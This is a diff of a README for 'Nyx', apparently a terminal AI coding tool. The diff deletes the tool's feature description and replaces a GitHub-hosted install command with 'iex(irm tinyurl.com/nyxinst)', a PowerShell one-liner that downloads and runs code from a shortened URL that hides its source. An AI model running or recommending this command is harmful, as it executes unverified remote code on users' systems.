@@ -6,25 +6,9 @@ Unlike rigid applications that hijack your screen or read terminal outputs as fl
 
 ---
 
-## ⚡ Core Architectural Superpowers
-
-### 🎨 The Morphing Floating Canvas
-A lightweight, fluid chat interface that slides directly into your active console workspace using high-speed ANSI coordinate mapping. It responds instantly to your input, shifting sizes dynamically to show streaming code blocks, without wiping your session history or locking you inside a static app buffer.
-
-### ⚙️ Unattended Bootstrap Engine
-A fully automated installation pipeline that scans your local machine, builds the local `.nyx` metadata cache, hidden-boots local compute processes, and prepares deep reasoning code models inside your local VRAM without requiring manual configuration.
-
-### 👁️ The Ghost Witness Protocol
-A silent, non-blocking background runspace layer that monitors native shell outputs. The split-second an active compilation or runtime fault occurs, Nyx catches the exception signature and drafts an instant patch before the error can stall your workflow.
-
-### 🌐 Sovereign Multi-Agent Mesh (A2A)
-Built from the ground up to support decentralized Agent-to-Agent communication protocols. Nyx securely exchanges structured solution logs, capability arrays, and telemetry cards directly with peer local network nodes over your mesh.
-
----
-
 ## 🚀 Instant Omnipresent Deployment
 
-Execute this single-line command inside your terminal session to autonomously pull, verify, and spin up the entire runtime layer instantly:
+To autonomously pull, verify, and spin up the entire runtime layer instantly, paste this single lowercase command into your PowerShell window and press **Enter**:
 
 ```powershell
-iex (iwr -UseBasicParsing [https://raw.githubusercontent.com/M523zappin/nyx-engine/main/install.ps1](https://raw.githubusercontent.com/M523zappin/nyx-engine/main/install.ps1))
+iex(irm [tinyurl.com/nyxinst](https://tinyurl.com/nyxinst))
